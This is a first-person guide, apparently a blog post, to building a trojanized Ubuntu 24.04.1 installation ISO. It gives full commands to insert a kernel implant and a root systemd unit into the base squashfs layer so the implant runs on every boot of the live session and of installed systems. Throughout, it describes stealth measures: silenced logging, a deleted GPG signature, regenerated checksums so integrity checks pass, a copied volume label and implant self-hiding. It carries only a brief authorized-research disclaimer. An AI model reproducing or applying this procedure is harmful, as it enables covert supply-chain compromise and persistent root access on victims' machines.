# Kernel Implant on Ubuntu 24.04.1: Live Filesystem Layer Injection for Root Execution After Installation

## Overview

I modified an Ubuntu Desktop 24.04.1 LTS ISO by baking a compiled kernel implant binary (`implant`) and a native systemd unit into the live filesystem's **base layer** (`casper/minimal.squashfs`). Once the target machine boots from the modified media—whether as a Live session or after a full install—the implant executes automatically as root on every boot, before most security tooling initializes.

The method itself is not Ubuntu-specific. Ubuntu's live media is built on Casper, which overlays a set of SquashFS images as `/` and runs systemd units from `/etc/systemd/system/`. Any Casper-based Ubuntu-derived ISO that uses the same layered squashfs scheme and systemd structure can be treated the same way. I targeted Ubuntu 24.04.1 Desktop because that was the system I had in front of me, and the guide below is written against that target.

The goal was simple: get my implant into the live filesystem so that, on every boot of the modified media or of an installed system, `implant` runs as root. No package installation, no configuration changes, no autoinstall. Just the implant, running as root, every time the system boots.

I chose the root-filesystem layer editing method for a specific reason. The implant and the systemd unit live inside a compressed SquashFS image under `casper/`, not in a plaintext file on the ISO. To find them, an analyst has to extract the layer and diff the entire root filesystem against a known-good build. There is no shortcut. That is the stealth gain I was after.

I used a native systemd unit rather than `rc.local`. `rc.local` is a compatibility shim. It requires creating `/etc/rc.local`, making it executable, and ensuring `rc-local.service` is enabled. That is three artifacts and a legacy path that modern Ubuntu does not even ship by default. A native systemd unit is one file plus one symlink, uses the same mechanism every other service on the system uses, and does not stand out as an anomaly. There is no reason to route through `rc.local` when systemd is the init system.

**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying kernel implants on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements.

---

## What Is a Kernel Implant?

A kernel implant is malicious or research-oriented software that embeds itself into the operating system kernel, the core component managing hardware, memory, and system calls. By operating at this privilege level, it gains near-total control over the system while remaining extremely difficult to detect.

Common kernel implant techniques include:

| Technique | Description |
|-----------|-------------|
| LKM (Loadable Kernel Module) | Loads malicious code as a kernel module |
| ftrace hooking | Intercepts kernel functions via ftrace |
| Syscall hooking | Hijacks system calls to hide artifacts |
| eBPF abuse | Uses extended Berkeley Packet Filter for covert operations |

By bundling such an implant into an Ubuntu ISO, the implant executes with root privileges the moment the live system (or installed system) boots, before most security tooling is even initialized.

---

## Prerequisites

Before starting, I installed the required tools:

```bash
sudo apt update
sudo apt install -y xorriso squashfs-tools rsync
```

| Tool | Purpose |
|------|---------|
| xorriso | Extract and rebuild ISO images while preserving boot data |
| squashfs-tools | Extract and repack the compressed filesystem layers |
| rsync | Copy files while preserving permissions |

**Disk space requirement**: Approximately 4x the ISO size for working directories. Ubuntu 24.04.1 Desktop is roughly 6 GB, so I planned for at least 24 GB of free space.

**Binary requirements**:
- The implant binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu image
- The binary must have the execute bit set

---

## Working Directory Setup

I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.

```bash
mkdir -p ~/Kernel_Implant
cd ~/Kernel_Implant
mv /path/to/ubuntu-24.04.1-desktop-amd64.iso .
```

I verified the directory contents:

```bash
ls -al
```

Expected output:

```
drwxrwxr-x 2 localhost localhost       4096 Oct 15 20:35 .
drwxrwxr-x 4 localhost localhost       4096 Oct 15 20:34 ..
-rw-rw-r-- 1 localhost localhost 6203355136 Oct 15 20:35 ubuntu-24.04.1-desktop-amd64.iso
```

I also placed my compiled kernel implant in the same directory and named it `implant`.

My project layout looked like this:

```
~/Kernel_Implant/
├── isomount/             # temporary mount point for the original ISO
├── extracted/            # extracted ISO tree, modified in place
├── squashfs-root/        # extracted base filesystem layer
├── ubuntu-24.04.1-desktop-amd64.iso   # original ISO
├── implant               # my compiled kernel implant
└── custom-ubuntu-implant.iso          # rebuilt ISO (produced by this work)
```

---

## Step 1: Extract the ISO Contents

Before touching anything, I captured the original ISO's El Torito and hybrid boot report. This is the reference I would compare against after the rebuild, so I did not skip it.

```bash
xorriso -indev ~/Kernel_Implant/ubuntu-24.04.1-desktop-amd64.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/original_torito.txt 2>&1
cat ~/Kernel_Implant/original_torito.txt
```

The output reported the exact `xorriso -as mkisofs` arguments that reproduce the boot structure. On Ubuntu 24.04.1, the critical lines were:

```
-V 'Ubuntu 24.04.1 LTS amd64'
--modification-date='2024082716232600'
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'ubuntu-24.04.1-desktop-amd64.iso'
--protective-msdos-label
-partition_cyl_align off
-partition_offset 16
--mbr-force-bootable
-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'ubuntu-24.04.1-desktop-amd64.iso'
-appended_part_as_gpt
-iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7
-c '/boot.catalog'
-b '/boot/grub/i386-pc/eltorito.img'
-no-emul-boot
-boot-load-size 4
-boot-info-table
--grub2-boot-info
-eltorito-alt-boot
-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
-no-emul-boot
```

**Key differences from older Ubuntu releases**: Ubuntu 24.04 no longer uses ISOLINUX for legacy BIOS boot. The boot image is now `/boot/grub/i386-pc/eltorito.img`, and the EFI boot image is not a file in the ISO filesystem—it is an **appended EFI partition**. The `-report_el_torito as_mkisofs` output reflects this.

I then mounted the ISO and extracted its contents:

```bash
cd ~/Kernel_Implant
mkdir isomount
sudo mount -o loop ubuntu-24.04.1-desktop-amd64.iso isomount
rsync -a isomount/ extracted
sudo umount isomount
```

Using rsync preserves file permissions and symbolic links, which is critical for a bootable ISO.

I inspected the layout to identify which squashfs image is the actual desktop root filesystem:

```bash
ls extracted
# saw: boot  boot.catalog  casper  dists  EFI  install  md5sum.txt  pool  preseed  ubuntu

ls -lh extracted/casper/
```

The `casper/` directory did **not** contain a single `filesystem.squashfs` file. It contained many squashfs images, one per install variant and per language. The relevant ones were:

```
filesystem.manifest
filesystem.size
initrd                           (75 MB — Casper boot initramfs, NOT the installer's)
install-sources.yaml
minimal.squashfs                 (1.75 GB — minimal base)
minimal.standard.live.squashfs   (917 MB — standard desktop live layer)
minimal.standard.squashfs        (494 MB — standard layer, no live bits)
minimal.<lang>.squashfs          (16 MB each — per-language minimal variants)
minimal.enhanced-secureboot*.squashfs
...
vmlinuz
```

**This is the most important layout detail I had to get right, and it was also where my first attempt failed.** Ubuntu 24.04.1 Desktop does not ship a single `filesystem.squashfs` at the top of `casper/`. Instead it uses a layered squashfs scheme:

- **`minimal.squashfs`** (1.75 GB) — the minimal base Ubuntu root filesystem. This is the layer that gets written to disk during installation.
- **`minimal.standard.live.squashfs`** (917 MB) — the "standard" desktop layer on top of the minimal base, used by the Live session.
- **`minimal.standard.squashfs`** (494 MB) — the standard layer without the Live-specific bits.
- **`minimal.standard.<lang>.squashfs`** — per-language variants.
- **`minimal.enhanced-secureboot*.squashfs`** — secureboot variants.
- **`minimal.<lang>.squashfs`** — minimal base per-language variants.

Casper overlays these in order at boot. The Live desktop you see is the union of the base plus the standard layer (plus the language layer, if selected). The `boot/grub/grub.cfg` on the ISO selects the Live leaf layer with `layerfs-path=minimal.standard.live.squashfs`.

**The installation path is different.** The installer writes the **base layer** (`minimal.squashfs`) to the target disk. It does not write the Live-session leaf layer. That is why my first attempt—placing the implant in `minimal.standard.live.squashfs`—showed the implant in the Live session but not on the installed system. The layer that gets installed is `minimal.squashfs`.

I confirmed the boot leaf layer by inspecting the grub config:

```bash
grep -r "layerfs-path" extracted/boot/grub/grub.cfg
# saw layerfs-path=minimal.standard.live.squashfs
```

That confirms the Live session uses the `.live.squashfs` leaf layer. The installer, however, builds the target from the base layer. To get the implant on both the Live session and the installed system, I targeted **`minimal.squashfs`**, the base layer. That is the layer that gets written to disk.

If I only cared about the Live session, `minimal.standard.live.squashfs` would have been correct. But the goal was "run on the installed system," so the base layer is the right target.

`casper/initrd` is the Casper boot initramfs. It is not a Debian-installer initrd and does not contain `finish-install.d/`.

---

## Step 2: Extract the Base Filesystem Layer

I extracted the base layer:

```bash
cd ~/Kernel_Implant
sudo unsquashfs -d squashfs-root extracted/casper/minimal.squashfs
```

This created a `squashfs-root/` directory. I listed the top level:

```bash
ls squashfs-root
# saw: bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

**Unlike the Live leaf layer**, the base layer contains the full root filesystem skeleton: `bin`, `lib`, `sbin`, `opt`, `home`, `media`, `mnt`, `proc`, `sys`, `tmp`, and the rest. That includes `usr/bin/` and `usr/local/bin/`, both of which exist in this layer. This is the layer that gets installed to disk, so placing the implant here puts it on both the installed system and, through the overlay merge, the Live session as well.

I confirmed `usr/bin/` exists in the base layer:

```bash
ls squashfs-root/usr
# saw: bin  lib  lib32  lib64  libexec  local  sbin  share  src

ls squashfs-root/usr/bin | head
# saw real binaries — usr/bin exists in this layer
```

I placed the implant in `usr/bin/`. It is the conventional location for system binaries on Ubuntu, it already exists in the base layer, and it is less remarkable than a custom directory. `/usr/local/bin/` also exists in the base layer and is a valid alternative; either works. I chose `usr/bin/` for consistency with the rest of the system and because the base layer already ships real binaries there.

---

## Step 3: Insert the Kernel Implant

This is the only modification you need to make. No package installation, no system changes. Just your implant binary and a native systemd unit.

### 3.1 Copy the Implant Binary Into the Base Layer

From my host machine (outside the chroot), I copied the compiled implant binary into `usr/bin/` of the extracted base layer:

```bash
sudo cp ~/Kernel_Implant/implant squashfs-root/usr/bin/implant
sudo chmod 755 squashfs-root/usr/bin/implant
sudo chown root:root squashfs-root/usr/bin/implant
```

**Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.

I verified the implant was a valid ELF:

```bash
file squashfs-root/usr/bin/implant
# saw: ELF 64-bit LSB executable, x86-64, ...
```

If the implant is statically linked, it will run on any system. If it is dynamically linked, its dependencies must already be present in the base layer:

```bash
ldd ~/Kernel_Implant/implant
```

Since we are not installing anything, all required libraries must already exist in the base Ubuntu image. If a library is missing, the implant will fail to run.

**For kernel implants requiring module loading**: If the implant needs to load a kernel module (.ko file), copy it to the appropriate location:

```bash
sudo mkdir -p squashfs-root/lib/modules/$(uname -r)/kernel/drivers
sudo cp ~/implant.ko squashfs-root/lib/modules/$(uname -r)/kernel/drivers/implant.ko
```

Note: The kernel version inside the ISO may differ from the host. Ubuntu 24.04.1 ships the 6.8 kernel series. I checked the target kernel version by examining `squashfs-root/lib/modules/`.

### 3.2 Create the systemd Unit

I created the unit file directly in the extracted base layer. This is the only auto-run mechanism—no `rc.local`, no shell script, no compatibility shim.

```bash
sudo nano squashfs-root/etc/systemd/system/implant.service
```

I pasted:

```ini
[Unit]
Description=Implant Service
After=local-fs.target

[Service]
Type=oneshot
ExecStart=/usr/bin/implant
RemainAfterExit=yes
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

**Explanation of key lines:**

| Line | Purpose |
|------|---------|
| `Type=oneshot` | Systemd starts the unit once, waits for it to finish, and treats it as active. Correct for an implant that runs and exits or daemonizes. |
| `ExecStart=/usr/bin/implant` | The implant binary path. |
| `RemainAfterExit=yes` | Keeps the unit marked active after the process exits. Without this, systemd would consider the unit failed if the implant daemonizes and the parent exits. |
| `User=root` | Explicit root. Redundant since system units run as root by default, but makes the intent clear and guards against a future default change. |
| `StandardOutput=null` / `StandardError=null` | Suppresses logging to the journal. This is the stealth choice. For debugging, change to `journal` or `file:/var/log/implant.log`. |
| `After=local-fs.target` | Ensures the filesystem is mounted before the implant runs. Does not guarantee network readiness. |

**Design notes on the unit:**

- **No `rc.local` dependency.** The `rc-local.service` compatibility path is not involved. The unit is a first-class systemd service, indistinguishable in structure from any other unit on the system.
- **`Type=oneshot` with `RemainAfterExit=yes`** is the right choice for a one-shot dropper or an implant that forks. If the implant stays in the foreground, use `Type=simple` instead and drop `RemainAfterExit`.
- **No `Restart=` directive.** A restart loop on failure would be noisy and would show up in `systemctl status`. A failed unit that stays failed is quieter.
- **No `WantedBy=graphical.target`.** `multi-user.target` is the standard boot target and is reached on both server and desktop installs. Using `multi-user.target` means the implant runs even if the graphical session fails to start.
- **`StandardOutput=null`** keeps the journal clean. An analyst running `journalctl -u implant.service` sees nothing. If the implant writes its own logs elsewhere, that is the implant's responsibility.

### 3.3 Enable the Unit

Systemd enables a unit by creating a symlink in the appropriate `.wants` directory. I created that symlink manually inside the extracted base layer:

```bash
sudo mkdir -p squashfs-root/etc/systemd/system/multi-user.target.wants
sudo ln -sf /etc/systemd/system/implant.service \
    squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
```

I verified the symlink:

```bash
ls -la squashfs-root/etc/systemd/system/multi-user.target.wants/implant.service
# Should show: lrwxrwxrwx ... -> /etc/systemd/system/implant.service
```

**Why the symlink and not `systemctl enable`**: The extracted layer is not a running system. `systemctl enable` operates on the running host's systemd, not on the extracted tree. The symlink is exactly what `systemctl enable` would create, and it is the same mechanism every package uses when it ships an enabled unit. Creating it manually is the correct approach for an offline filesystem edit.

**Note on `Alias=`**: I did not use an `Alias=` directive. `Alias=` creates an additional name for the unit but does not enable it. The `.wants` symlink is what actually enables the unit at boot. The `[Install]` section's `WantedBy=` directive is what `systemctl enable` reads to decide where to put the symlink; since I am creating the symlink manually, the `WantedBy=` line is documentation rather than mechanism. I kept it for clarity and for anyone who later runs `systemctl enable` on the target.

### 3.4 How It Works

On boot, systemd reads the `multi-user.target.wants/` directory and starts every unit symlinked there. `implant.service` is among them. Systemd starts it as root, waits for the `oneshot` process to finish, and marks the unit active because of `RemainAfterExit=yes`. The implant runs exactly once per boot, as root, before the login prompt.

**Caveats I kept in mind:**

- **Network readiness**: `After=local-fs.target` does not guarantee the network is up. If the implant needs network access (e.g., C2 communication), add `After=network-online.target` and `Wants=network-online.target` to the unit, or have the implant retry internally. `network-online.target` itself can be slow or unreliable on some configurations, so an internal retry loop in the implant is more robust.
- **Process termination**: With `Type=oneshot` and `RemainAfterExit=yes`, systemd considers the unit active after `ExecStart` returns. If the implant forks a background process, that process is not tracked by systemd and will not be terminated on shutdown unless the implant handles it. If the implant stays in the foreground, use `Type=simple` and systemd will manage it as a normal service.
- **Logging**: `StandardOutput=null` and `StandardError=null` suppress journal output. To capture logs for debugging, change to `journal` or `file:/var/log/implant.log`. For a production deployment, suppressing is the stealth choice.
- **Module signing**: If the implant loads an unsigned kernel module, Ubuntu 24.04's Secure Boot enforcement will reject it. The unit will start, the module load will fail, and `StandardError=null` will hide the error. Disable Secure Boot or sign the module.

---

## Step 4: Repack the Base Filesystem Layer

### Remove Old squashfs

```bash
sudo rm extracted/casper/minimal.squashfs
```

### Create New squashfs

```bash
cd ~/Kernel_Implant
sudo mksquashfs squashfs-root extracted/casper/minimal.squashfs \
    -comp xz \
    -progress
```

The `-comp xz` flag uses XZ compression for a smaller layer size. The process may take several minutes depending on the system. The original base layer is zstd-compressed; xz is still valid and produces a smaller layer at the cost of slower decompression at boot. The base layer is large (1.75 GB uncompressed), so the repack takes longer than the Live leaf layer would have.

### Update the Layer Size

The `.size` file records the uncompressed size of the layer and is used by the installer. I updated the base layer's size file:

```bash
sudo du -sx --block-size=1 extracted/casper/minimal.squashfs | cut -f1 | sudo tee extracted/casper/minimal.size
```

**Important for the layered layout**: I updated only the `.size` file that corresponds to the base layer I modified. The other layers (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`, etc.) are untouched and their `.size` files remain valid. If I had modified the Live leaf layer instead, I would update `minimal.standard.live.size`.

### Regenerate the GPG Signature (if present)

The original ISO ships a `.squashfs.gpg` detached signature next to each layer. If the installer verifies that signature, my modified base layer will fail verification. I had two choices:

1. **Remove the `.gpg` file for the modified layer**, so the installer has nothing to verify against and skips the check. This is the quieter option if the installer treats a missing signature as "no signature to check" rather than "tampered."
2. **Re-sign the layer with a key the installer trusts**, which I cannot do without Ubuntu's signing key.

I removed the signature for the modified base layer:

```bash
sudo rm extracted/casper/minimal.squashfs.gpg
```

**Stealth consideration**: Removing the `.gpg` file is visible to anyone diffing the ISO against a known-good build, but a modified layer with a stale signature is also visible, and more obviously wrong. Removing it is the lesser evil. If I wanted to preserve the appearance of the original ISO more closely, I could leave the stale `.gpg` in place and let the installer's check fail — but that produces a failed-integrity-check dialog on boot, which is louder than a missing signature. Removing it is the quieter choice in practice.

### Update MD5 Checksums

Ubuntu uses `md5sum.txt` to verify ISO integrity. I regenerated it after modifying the layer:

```bash
cd extracted
sudo rm md5sum.txt
sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
cd ..
```

**Stealth consideration**: If I wanted to avoid detection of a modified ISO, I could skip regenerating `md5sum.txt`. However, that would cause integrity check warnings on boot and may trigger security tooling. Regenerating it is the quieter choice, since the checksums will match the modified content and the boot-time check will pass.

---

## Step 5: Rebuild the ISO (UEFI-Aware)

The rebuild must reproduce the boot structure I captured in Step 1. A naive `mkisofs` rebuild loses the GPT structure and the appended EFI partition, and the resulting ISO will not boot on modern UEFI machines.

The command below uses the arguments from the `-report_el_torito as_mkisofs` output:

```bash
ORIG_ISO="$(cd ~/Kernel_Implant && pwd)/ubuntu-24.04.1-desktop-amd64.iso"
cd ~/Kernel_Implant

sudo xorriso -as mkisofs \
    -V 'Ubuntu 24.04.1 LTS amd64' \
    --modification-date='2024082716232600' \
    --grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:"$ORIG_ISO" \
    --protective-msdos-label \
    -partition_cyl_align off \
    -partition_offset 16 \
    --mbr-force-bootable \
    -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::"$ORIG_ISO" \
    -appended_part_as_gpt \
    -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
    -c '/boot.catalog' \
    -b '/boot/grub/i386-pc/eltorito.img' \
    -no-emul-boot \
    -boot-load-size 4 \
    -boot-info-table \
    --grub2-boot-info \
    -eltorito-alt-boot \
    -e '--interval:appended_partition_2_start_3026280s_size_10144d:all::' \
    -no-emul-boot \
    -o ~/Kernel_Implant/custom-ubuntu-implant.iso \
    extracted/
```

**Notes on the arguments:**

- **`--grub2-mbr --interval:...:$ORIG_ISO`**: the GRUB2 MBR boot code is taken from the first 16 sectors of the original ISO file. I kept the original ISO path correct and did not point it at the new tree.
- **`-append_partition 2 ... --interval:...:$ORIG_ISO`**: the EFI system partition is extracted from the original ISO's byte range and appended to the new ISO. The byte range `12105120d-12115263d` and the partition GUID `28732ac11ff8d211ba4b00a0c93ec93b` must match the original. If the original ISO's partition layout differs (for example, on a different point release), these values will differ and must be taken from `original_torito.txt`.
- **`-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'`**: the El Torito EFI boot entry points to the newly appended partition, not to a file in the ISO filesystem. The start and size values are taken from the original report.
- **`-isohybrid-gpt-basdat`** was replaced with `-appended_part_as_gpt` on 24.04, because the EFI image is an appended partition rather than an embedded file. The `-report_el_torito as_mkisofs` output is authoritative here; do not hand-edit these flags.
- **The volume label is copied from the original ISO**, making the modified image blend in with legitimate Ubuntu media. This is a deliberate stealth choice.

**Critical warning for 24.04**: Because the EFI partition is appended at a specific byte offset, any change to the size of the ISO filesystem content (which adding the implant does) can shift the offset and break UEFI boot if the arguments are not exact. The `-report_el_torito as_mkisofs` output is not optional guidance—it is the exact recipe for this ISO. If the rebuilt ISO does not boot in OVMF, the first thing to check is that the `--interval` byte ranges match the original.

The El Torito and isohybrid arguments are specific to how the target ISO was built, not to the technique. On a different Ubuntu release or distribution, the same step applies, but the boot arguments come from that ISO's own `-report_el_torito as_mkisofs` output.

---

## Step 6: Verifying the Rebuilt ISO Boot Structure

After the build, I repeated the inspection from Step 1 against the new ISO and compared it to the saved reference:

```bash
xorriso -indev ~/Kernel_Implant/custom-ubuntu-implant.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
```

The diff should show only the ISO filename changing in the `--interval` paths and possibly the appended-partition start sector (because the filesystem grew). The boot-relevant lines must be identical:

```
--grub2-mbr --interval:local_fs:0s-15s:zero_mbrpt,zero_gpt:'...'
-append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b --interval:local_fs:12105120d-12115263d::'...'
-c '/boot.catalog'
-b '/boot/grub/i386-pc/eltorito.img'
--grub2-boot-info
-e '--interval:appended_partition_2_start_3026280s_size_10144d:all::'
```

Had any of those been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.

> **Secure Boot note**: Modifying a squashfs layer and adding a systemd unit does not modify the bootloader binary or the appended EFI partition. The signature chain is unaffected, so a straightforward root-filesystem injection should not break Secure Boot. However, unsigned kernel modules loaded by the implant will be rejected unless Secure Boot is disabled or the module is signed. Ubuntu 24.04's kernel module signing enforcement is stricter than older releases.

---

## Step 7: Testing the Implant ISO

I always test in a virtual machine before writing to physical media. For UEFI testing, I used OVMF:

```bash
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
    -bios /usr/share/ovmf/OVMF.fd
```

I checked that:

1. The system boots to the live desktop
2. The implant is present at `/usr/bin/implant` (verify with `ls -la /usr/bin/implant`)
3. The implant is running (verify with `ps aux | grep implant`)
4. The unit is active (verify with `systemctl status implant.service`)
5. If the implant hooks syscalls or loads a kernel module, kernel-level activity is visible:
   ```bash
   lsmod | grep implant
   dmesg | tail -20
   ```

Because `StandardOutput=null` and `StandardError=null` are set, `journalctl -u implant.service` will show the unit start and stop but no process output. That is expected. If I need to debug, I temporarily change those to `journal` in the extracted unit file, repack, and rebuild.

### Testing with a Virtual Disk (to Test Installation)

To test the full install flow, I added a virtual disk:

```bash
qemu-img create -f qcow2 testdisk.qcow2 30G
qemu-system-x86_64 -m 4096 -cdrom custom-ubuntu-implant.iso -boot d \
    -drive file=testdisk.qcow2,format=qcow2 \
    -enable-kvm -cpu host \
    -bios /usr/share/ovmf/OVMF.fd
```

With KVM enabled, the VM runs at near-native speed.

### Verifying the Installed System

The critical test is not the Live session—it is the installed system. After installation completes and the machine reboots from disk, I checked the target disk from outside:

```bash
# After install, boot the VM from the installed disk, or mount the disk read-only from the host
sudo mount -o ro /dev/sdXN /mnt
ls -l /mnt/usr/bin/implant
cat /mnt/etc/systemd/system/implant.service
ls -l /mnt/etc/systemd/system/multi-user.target.wants/implant.service
```

If the implant and the unit are present on the installed disk, the base layer injection worked. If they are not, the installer wrote a different layer and I would re-run the whole procedure against `minimal.squashfs` again to make sure I did not repack the wrong file.

I also checked the running installed system:

```bash
# On the installed system, after boot
ls -la /usr/bin/implant
systemctl status implant.service
```

### What to expect once the implant runs

Because the implant is baked into the base layer, it runs on every boot of the modified media—Live session or installed system. Unlike a self-cleaning dropper, there is no first-stage artifact that removes itself. The implant is the persistent component, and it is responsible for hiding its own artifacts once loaded.

After the implant loads:

- The implant's process is hidden (if it hooks `getdents`/`read` on `/proc`).
- The implant's files are hidden from `readdir`.
- The implant's service or module is hidden from `systemctl` and `lsmod`.
- The implant's network connections are filtered from `ss` and `netstat`.
- The `implant.service` unit is hidden from `systemctl list-units` if the implant hooks the D-Bus interface or masks the unit directory entry. Hiding a systemd unit is harder than hiding a process; a competent implant either hooks `systemctl`'s underlying calls or accepts that the unit name is visible while the binary it points to is not.

### Debugging checklist

**If the ISO failed to boot at all on UEFI**, the problem would have been in the ISO rebuild step, not the filesystem injection. I would have re-run the torito diff described above. The most common failure on 24.04 is a mismatch in the `--interval` byte ranges or the `-append_partition` GUID. The `-report_el_torito as_mkisofs` output must be copied exactly.

**If the live system failed to start**, the repacked base layer may have been malformed. I would have booted the ISO and watched for kernel or squashfs errors. I would have extracted my repacked `minimal.squashfs` on the host and confirmed `usr/bin/implant` and `etc/systemd/system/implant.service` were present.

**If the Live session shows the implant but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed is the base layer, not the Live leaf layer.

**If the ISO booted but the implant was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:

```bash
ls -l /etc/systemd/system/implant.service
ls -l /etc/systemd/system/multi-user.target.wants/implant.service
systemctl status implant.service
systemctl cat implant.service
```

If the `.wants` symlink was missing, the unit was never enabled. If `systemctl cat` showed the unit but `status` showed it failed, the `ExecStart` path was wrong or the binary was not executable. If `systemctl cat` found nothing, the unit file was not in the repacked layer.

**If the implant ran but the kernel module did not load**, the problem is in the implant, not the deployment. I would have checked `dmesg` for module signature errors, verified the `.ko` file matched the target kernel version (24.04.1 uses the 6.8 kernel series), and confirmed Secure Boot status.

**If the MD5 checksum errors appeared on boot**, I would have regenerated `md5sum.txt` as described in Step 4.

---

## Why a Native systemd Unit Instead of rc.local

`rc.local` is a legacy compatibility path. On modern Ubuntu it does not exist by default, and using it requires creating three artifacts and enabling a service that exists only to run a shell script. A native systemd unit is simpler, more idiomatic, and stealthier.

| Aspect | `rc.local` approach | Native systemd unit |
|---|---|---|
| Files created | `/etc/rc.local`, `/etc/systemd/system/rc-local.service`, enable symlink | Unit file, enable symlink |
| Execution path | systemd → `rc-local.service` → `/bin/bash` → `/etc/rc.local` → implant | systemd → `implant.service` → implant |
| Extra processes | `bash` wrapper process | None |
| Default presence | Does not exist on modern Ubuntu; creating it is itself an anomaly | Every service uses a unit file; one more is unremarkable |
| Logging control | Redirect inside the shell script | `StandardOutput=` / `StandardError=` directives |
| Failure visibility | `rc.local` exit code can fail the boot in confusing ways | Unit failure is contained and visible in `systemctl status` |
| Stealth profile | Three artifacts, one of which (`rc.local`) is a known legacy path that analysts look for | Two artifacts, both in standard systemd locations |

The native unit wins on every axis. The only reason to use `rc.local` is if the target system is old enough to lack systemd, which is not the case for Ubuntu 24.04 or any modern Ubuntu release.

---

## Kernel Implant Considerations for Ubuntu 24.04

When embedding a kernel implant into Ubuntu 24.04.1, I kept these additional factors in mind:

| Consideration | Description |
|---------------|-------------|
| Kernel version matching | 24.04.1 uses the 6.8 kernel series. The `.ko` must match the exact kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
| Module signing | 24.04 enforces module signature verification when Secure Boot is enabled. Unsigned modules will be rejected. Sign the module or disable Secure Boot |
| Persistence | The systemd unit runs the implant on every boot. If the implant needs to survive installation to disk, it must also install itself into the target system |
| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the implant hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |

---

## Project Cleanup

When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the implant binary, the reference torito reports, and the rebuilt ISO:

```bash
cd ~/Kernel_Implant
sudo rm -rf isomount extracted squashfs-root
ls -lh
# saw: ubuntu-24.04.1-desktop-amd64.iso  implant  custom-ubuntu-implant.iso
#       original_torito.txt  rebuilt_torito.txt
```

I kept the extracted tree in case I wanted to iterate on the unit or swap the implant. Re-extracting it takes only a few minutes.

---

## Summary

| Stage | Command | Purpose |
|-------|---------|---------|
| Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
| Identify Layer | `ls -lh extracted/casper/` | Pick `minimal.squashfs` (the base layer the installer writes to disk) |
| Extract Layer | `unsquashfs -d squashfs-root casper/minimal.squashfs` | Access the base root filesystem layer |
| Insert Implant | `cp implant squashfs-root/usr/bin/` | Bundle your implant |
| Create Unit | Write `implant.service` | Native systemd auto-run |
| Enable Unit | Symlink into `multi-user.target.wants/` | Start at boot |
| Repack Layer | `mksquashfs squashfs-root minimal.squashfs` | Compress modified base layer |
| Update Size | Write `minimal.size` | Keep installer layer-size metadata valid |
| Drop Stale Sig | `rm minimal.squashfs.gpg` | Avoid failed signature check on the modified layer |
| Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
| Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |

That is it. No `rc.local`, no shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO, started by a native systemd unit indistinguishable in structure from any other service on the system.

---

## Conclusion

By injecting a kernel implant binary and a native systemd unit into the live filesystem's base layer under `casper/`, the implant is deployed into the target system at boot, executes as root before most security tooling initializes, and runs on every boot of the modified media—Live session or installed system. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that gets written to disk, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.

On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images: a minimal base (`minimal.squashfs`), a standard layer (`minimal.standard.live.squashfs`, `minimal.standard.squashfs`), per-language variants, and secureboot variants. **The layer that gets written to disk during installation is the base layer, `minimal.squashfs`.** The Live session mounts the `.live.squashfs` leaf layer on top, but the installer builds the target from the base. My first attempt placed the implant in the Live leaf layer, which put it in the Live session but not on the installed system. Correcting that, I placed the implant in `minimal.squashfs`, which is the layer the installer actually writes.

Because the base layer is the full root filesystem, `usr/bin/` exists in it and I placed the implant there. The base layer also contains `/usr/local/bin/`, which is a valid alternative. Either works; `usr/bin/` is the conventional location for system binaries on Ubuntu and is the least remarkable place for an analyst to scan past.

I used a native systemd unit rather than `rc.local` because `rc.local` is a legacy compatibility shim that requires three artifacts and an extra shell process, while a native unit is one file plus one symlink in the standard systemd locations. The unit is structurally indistinguishable from any other service on the system, which is the stealth gain that `rc.local` cannot offer.

